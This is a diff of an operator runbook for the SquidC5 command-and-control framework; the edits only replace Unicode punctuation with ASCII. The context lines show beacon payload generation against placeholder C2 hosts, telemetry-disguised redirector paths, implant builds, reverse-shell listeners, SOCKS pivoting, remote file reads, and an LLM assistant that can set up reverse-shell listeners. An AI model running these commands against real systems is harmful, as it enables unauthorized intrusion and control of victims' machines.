@@ -1,6 +1,6 @@
 # SquidC5 Operator Runbook
 
-**Command · Control · Cognitive · Collaborative · Coordination**
+**Command - Control - Cognitive - Collaborative - Coordination**
 
 Authorized red team / pen-test use only.
 
@@ -44,8 +44,8 @@ sc5 --help
 
 ### See also
 
-- [User guide — CLI reference](user-guide.md#cli-reference)
-- [Root README — Quick start](../README.md#quick-start-local)
+- [User guide - CLI reference](user-guide.md#cli-reference)
+- [Root README - Quick start](../README.md#quick-start-local)
 
 ---
 
@@ -57,7 +57,7 @@ Authenticate `sc5` against a running teamserver.
 
 ### Prerequisites
 
-- Bootstrap or operator token (`data/admin_token.txt` on first start — never commit)
+- Bootstrap or operator token (`data/admin_token.txt` on first start - never commit)
 - Teamserver URL (HTTPS by default)
 
 ### Steps
@@ -68,7 +68,7 @@ sc5 health
 sc5 whoami
 ```
 
-Config stored at `~/.config/squidc5/config.json` (mode 0600).  
+Config stored at `~/.config/squidc5/config.json` (mode 0600). 
 Use `--insecure` only for self-signed lab certs.
 
 ### Verify
@@ -90,8 +90,8 @@ sc5 whoami
 
 ### See also
 
-- [User guide — Connection](user-guide.md#connection)
-- [Deployment — TLS](deployment.md#tls-https-default-on-new-instances)
+- [User guide - Connection](user-guide.md#connection)
+- [Deployment - TLS](deployment.md#tls-https-default-on-new-instances)
 
 ---
 
@@ -132,7 +132,7 @@ sc5 events
 
 - `sc5 listeners list` shows `running`
 - Session `kind: reverse_shell` with `verified: true`
-- `sc5 shell … "whoami"` returns remote output
+- `sc5 shell ... "whoami"` returns remote output
 
 ### If reverse shell fails
 
@@ -146,9 +146,9 @@ sc5 events
 
 ### See also
 
-- [User guide — Shell](user-guide.md#shell)
-- [User guide — Listeners](user-guide.md#listeners)
-- [Deployment — Privileged ports](deployment.md#privileged-ports)
+- [User guide - Shell](user-guide.md#shell)
+- [User guide - Listeners](user-guide.md#listeners)
+- [Deployment - Privileged ports](deployment.md#privileged-ports)
 
 ---
 
@@ -188,8 +188,8 @@ sc5 tasks get <task_id>
 
 ### See also
 
-- [User guide — Tasks](user-guide.md#tasks)
-- [User guide — C2 profiles](user-guide.md#c2-profiles-profiles)
+- [User guide - Tasks](user-guide.md#tasks)
+- [User guide - C2 profiles](user-guide.md#c2-profiles-profiles)
 
 ---
 
@@ -207,26 +207,26 @@ Mint least-privilege tokens for operators or MCP.
 
 ```bash
 sc5 tokens create ops \
-  --scopes "sessions:read,sessions:write,tasks:read,tasks:write,listeners:read,listeners:write,payloads:generate,metrics:read,audit:read"
+ --scopes "sessions:read,sessions:write,tasks:read,tasks:write,listeners:read,listeners:write,payloads:generate,metrics:read,audit:read"
 
 sc5 tokens create ext-ai \
-  --scopes "mcp:connect,sessions:read,tasks:read,tasks:write,metrics:read" \
-  --mcp-tools "list_sessions,get_session,list_tasks,create_task,get_metrics"
+ --scopes "mcp:connect,sessions:read,tasks:read,tasks:write,metrics:read" \
+ --mcp-tools "list_sessions,get_session,list_tasks,create_task,get_metrics"
 ```
 
-Raw `sc5_…` is shown **once** — store in a password manager.
+Raw `sc5_...` is shown **once** - store in a password manager.
 
 ### Verify
 
 ```bash
 sc5 tokens list
-sc5 login --url … --token <new> --insecure && sc5 whoami
+sc5 login --url ... --token <new> --insecure && sc5 whoami
 ```
 
 ### See also
 
-- [User guide — Tokens](user-guide.md#tokens)
-- [User guide — MCP tools](user-guide.md#mcp-tools)
+- [User guide - Tokens](user-guide.md#tokens)
+- [User guide - MCP tools](user-guide.md#mcp-tools)
 
 ---
 
@@ -239,14 +239,14 @@ Use INKO chat to inspect and act on the live teamserver under rails.
 ### Prerequisites
 
 - Token with `ai:use` or `admin`
-- Optional: LLM configured ([User guide — LLM](user-guide.md#llm-connections))
+- Optional: LLM configured ([User guide - LLM](user-guide.md#llm-connections))
 
 ### Steps
 
 **Ops UI:**
 
-1. Configure LLM under **Admin** (or `sc5 llm add …`) — optional; offline intents still work.
-2. Top-bar **◈ INKO** → right flyout (full screen on mobile). Nav **INKO** for full workspace + model switcher.
+1. Configure LLM under **Admin** (or `sc5 llm add ...`) - optional; offline intents still work.
+2. Top-bar **INKO** -> right flyout (full screen on mobile). Nav **INKO** for full workspace + model switcher.
 3. Pick connection and model. Enter sends; Shift+Enter newline. Escape / backdrop closes flyout.
 4. Chat history is browser-local; tool calls are audited server-side (scopes + policy + HITL).
 
@@ -262,7 +262,7 @@ sc5 llm add grok-prod grok-3 --provider xai --base-url https://api.x.ai/v1 --api
 
 REST: `POST /api/v1/ai/chat`, `POST /api/v1/ai/run`, `GET /api/v1/ai/tools`, `GET /api/v1/ai/status`.
 
-Example asks: *“list sessions”*, *“setup reverse shell listener on 4444”*, *“show recent events”*, *“save this payload as an artifact”*.
+Example asks: *"list sessions"*, *"setup reverse shell listener on 4444"*, *"show recent events"*, *"save this payload as an artifact"*.
 
 ### Verify
 
@@ -279,8 +279,8 @@ Example asks: *“list sessions”*, *“setup reverse shell listener on 4444”
 
 ### See also
 
-- [User guide — INKO](user-guide.md#inko-intelligent-neural-kinetic-operator)
-- [User guide — LLM connections](user-guide.md#llm-connections)
+- [User guide - INKO](user-guide.md#inko-intelligent-neural-kinetic-operator)
+- [User guide - LLM connections](user-guide.md#llm-connections)
 
 ---
 
@@ -304,7 +304,7 @@ sc5 events
 sc5 policy get
 ```
 
-Ops → **Observe**.
+Ops -> **Observe**.
 
 ### Verify
 
@@ -313,7 +313,7 @@ Ops → **Observe**.
 
 ### See also
 
-- [User guide — Observability](user-guide.md#observability)
+- [User guide - Observability](user-guide.md#observability)
 
 ---
 
@@ -339,7 +339,7 @@ sc5 repl
 
 ### See also
 
-- [User guide — CLI reference](user-guide.md#cli-reference)
+- [User guide - CLI reference](user-guide.md#cli-reference)
 
 ---
 
@@ -370,7 +370,7 @@ sc5 payloads generate http_beacon_python <CDN_HOST> 443 --scheme https --raw
 sc5 redirector --server-name cdn.example --uris /v1/telemetry,/api/v1/implant/beacon --raw
 ```
 
-Ops → **Profiles** → activate → **Payloads** → generate.
+Ops -> **Profiles** -> activate -> **Payloads** -> generate.
 
 Lab cert helper (host with certbot): `scripts/acme_lab_renew.sh` with `DOMAINS=... EMAIL=...`.
 
@@ -388,8 +388,8 @@ Lab cert helper (host with certbot): `scripts/acme_lab_renew.sh` with `DOMAINS=.
 
 ### See also
 
-- [User guide — C2 profiles](user-guide.md#c2-profiles-profiles)
-- [User guide — Redirector](user-guide.md#redirector-and-certificates)
+- [User guide - C2 profiles](user-guide.md#c2-profiles-profiles)
+- [User guide - Redirector](user-guide.md#redirector-and-certificates)
 
 ---
 
@@ -417,7 +417,7 @@ sc5 payloads generate dns_beacon_python <DNS_HOST> 5353 --zone c2.lab.invalid --
 
 ### See also
 
-- [User guide — Listeners](user-guide.md#listeners)
+- [User guide - Listeners](user-guide.md#listeners)
 - [OAST Collaborator](#oast-collaborator-http-dns-smtp) (related DNS path)
 
 ---
@@ -430,7 +430,7 @@ Mint OAST tokens and poll out-of-band hits.
 
 ### Prerequisites
 
-- OAST zone and listeners configured — [Deployment — OAST](deployment.md#oast-collaborator-dns-http-smtp)
+- OAST zone and listeners configured - [Deployment - OAST](deployment.md#oast-collaborator-dns-http-smtp)
 - CLI with access to teamserver
 
 ### Steps
@@ -439,17 +439,17 @@ Mint OAST tokens and poll out-of-band hits.
 sc5 --insecure login --url https://TEAM:8443 --token sc5_...
 
 sc5 --insecure oast token create --note "sqli-oob"
-# → dns_name, http_url, smtp_to
+# -> dns_name, http_url, smtp_to
 
 sc5 --insecure oast tokens list
 sc5 --insecure oast hits --token <TOKEN>
 sc5 --insecure oast hits --token <TOKEN> --protocol dns
 ```
 
-DNS listener config: `--zone oast.example.com --dns-mode both` (or `oast` / `beacon`).  
+DNS listener config: `--zone oast.example.com --dns-mode both` (or `oast` / `beacon`). 
 SMTP is log-only (feature `smtp_oast`, default off).
 
-Point lab zone NS/records at the C2 host (**authorized lab only**; use *your* zone/IP — examples in deployment are illustrative).
+Point lab zone NS/records at the C2 host (**authorized lab only**; use *your* zone/IP - examples in deployment are illustrative).
 
 ### Verify
 
@@ -464,13 +464,13 @@ sc5 --insecure oast hits --token <TOKEN>
 | Symptom | Check |
 |---------|--------|
 | No DNS hits | NS delegation, firewall 53/udp+tcp |
-| No SMTP | Feature flag; provider blocks 25 — try 2525 |
+| No SMTP | Feature flag; provider blocks 25 - try 2525 |
 | No HTTP | Listener on 80 running; public host correct |
 
 ### See also
 
-- [User guide — OAST](user-guide.md#oast-collaborator)
-- [Deployment — OAST](deployment.md#oast-collaborator-dns-http-smtp)
+- [User guide - OAST](user-guide.md#oast-collaborator)
+- [Deployment - OAST](deployment.md#oast-collaborator-dns-http-smtp)
 
 ---
 
@@ -499,7 +499,7 @@ Server path: `/ws/v1/beacon` (or WS profile path).
 
 ### See also
 
-- [User guide — Payloads](user-guide.md#payloads-and-implants)
+- [User guide - Payloads](user-guide.md#payloads-and-implants)
 
 ---
 
@@ -531,7 +531,7 @@ See [agents/sc5beacon/README.md](../agents/sc5beacon/README.md).
 ```bash
 cd agents/sc5beacon && go build -o sc5beacon .
 export SC5_URL="https://C2:8443/api/v1/implant/beacon"
-export SC5_PSK="$(cat data/implant_psk.txt)"   # from teamserver
+export SC5_PSK="$(cat data/implant_psk.txt)" # from teamserver
 ./sc5beacon
 ```
 
@@ -540,12 +540,12 @@ Server must have `SQUIDC5_IMPLANT_REQUIRE_AUTH=true` (default) and matching PSK.
 ### Verify
 
 - Session appears as authenticated beacon
-- Optional: save build under Ops → **Artifacts**
+- Optional: save build under Ops -> **Artifacts**
 
 ### See also
 
-- [User guide — Payloads and implants](user-guide.md#payloads-and-implants)
-- [User guide — Artifacts](user-guide.md#artifacts)
+- [User guide - Payloads and implants](user-guide.md#payloads-and-implants)
+- [User guide - Artifacts](user-guide.md#artifacts)
 
 ---
 
@@ -565,15 +565,15 @@ Open a SOCKS5 pivot through an implant session.
 ```bash
 # Implant reverse-dial (default): needs live beacon session
 curl -sk -X POST -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" \
-  -d '{"session_id":"ses_...","mode":"implant","listen_host":"127.0.0.1"}' \
-  https://C2:8443/api/v1/pivot/socks
+ -d '{"session_id":"ses_...","mode":"implant","listen_host":"127.0.0.1"}' \
+ https://C2:8443/api/v1/pivot/socks
 # Point proxy tool at returned listen_port; implant handles socks:connect tasks
 
 # Direct mode: C2 dials targets itself (lab only)
 # mode=direct
 ```
 
-Ops → **Post-Ex** with session selected.
+Ops -> **Post-Ex** with session selected.
 
 ### Verify
 
@@ -581,7 +581,7 @@ Ops → **Post-Ex** with session selected.
 
 ### See also
 
-- [User guide — Post-Ex](user-guide.md#post-ex)
+- [User guide - Post-Ex](user-guide.md#post-ex)
 
 ---
 
@@ -603,7 +603,7 @@ List/read/write/delete files on a session.
 # {"session_id":"...","op":"read","path":"/etc/hosts","offset":0,"length":1024}
 ```
 
-Ops → **Post-Ex** / context rail.
+Ops -> **Post-Ex** / context rail.
 
 ### Verify
 
@@ -611,7 +611,7 @@ Ops → **Post-Ex** / context rail.
 
 ### See also
 
-- [User guide — Post-Ex](user-guide.md#post-ex)
+- [User guide - Post-Ex](user-guide.md#post-ex)
 
 ---
 
@@ -637,7 +637,7 @@ sc5 audit-verify --limit 500
 
 ### See also
 
-- [User guide — Observability](user-guide.md#observability)
+- [User guide - Observability](user-guide.md#observability)
 
 ---
 
@@ -660,33 +660,33 @@ sc5 teams add-member <team_id> operator-b --role operator
 
 # Claim / release (REST)
 curl -sk -H "Authorization: Bearer $TOK" -X POST \
-  "$URL/api/v1/sessions/$SID/claim"
+ "$URL/api/v1/sessions/$SID/claim"
 curl -sk -H "Authorization: Bearer $TOK" -X POST \
-  "$URL/api/v1/sessions/$SID/release"
+ "$URL/api/v1/sessions/$SID/release"
 
 # Handoff pack (transfers claim)
 curl -sk -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" \
-  -d '{"to":"operator-b","note":"your turn","include_pack":true}' \
-  -X POST "$URL/api/v1/sessions/$SID/handoff"
+ -d '{"to":"operator-b","note":"your turn","include_pack":true}' \
+ -X POST "$URL/api/v1/sessions/$SID/handoff"
 
 # Spectator (read-only)
 curl -sk -H "Authorization: Bearer $TOK" \
-  "$URL/api/v1/sessions/$SID/spectator"
+ "$URL/api/v1/sessions/$SID/spectator"
 
 # Presence + team chat
 curl -sk -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" \
-  -d '{"status":"online","viewing_session":"'"$SID"'"}' \
-  -X POST "$URL/api/v1/collab/presence"
+ -d '{"status":"online","viewing_session":"'"$SID"'"}' \
+ -X POST "$URL/api/v1/collab/presence"
 curl -sk -H "Authorization: Bearer $TOK" "$URL/api/v1/collab/presence"
 curl -sk -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" \
-  -d '{"message":"standing by","team_id":"'"$TEAM"'"}' \
-  -X POST "$URL/api/v1/collab/chat"
+ -d '{"message":"standing by","team_id":"'"$TEAM"'"}' \
+ -X POST "$URL/api/v1/collab/chat"
 
 # My actions
 curl -sk -H "Authorization: Bearer $TOK" "$URL/api/v1/audit/me?limit=50"
 ```
 
-Ops → **Collab**.
+Ops -> **Collab**.
 
 ### Verify
 
@@ -695,7 +695,7 @@ Ops → **Collab**.
 
 ### See also
 
-- [User guide — Multi-operator collab](user-guide.md#multi-operator-collab)
+- [User guide - Multi-operator collab](user-guide.md#multi-operator-collab)
 
 ---
 
@@ -722,8 +722,8 @@ sc5 chain recon_then_classify --data "windows domain lab"
 
 ### See also
 
-- [User guide — INKO](user-guide.md#inko-intelligent-neural-kinetic-operator)
-- [User guide — Policy](user-guide.md#policy)
+- [User guide - INKO](user-guide.md#inko-intelligent-neural-kinetic-operator)
+- [User guide - Policy](user-guide.md#policy)
 
 ---
 
@@ -749,4 +749,4 @@ sc5 report --raw > engagement-report.md
 
 ### See also
 
-- [User guide — Timeline and reports](user-guide.md#timeline-and-reports)
+- [User guide - Timeline and reports](user-guide.md#timeline-and-reports)
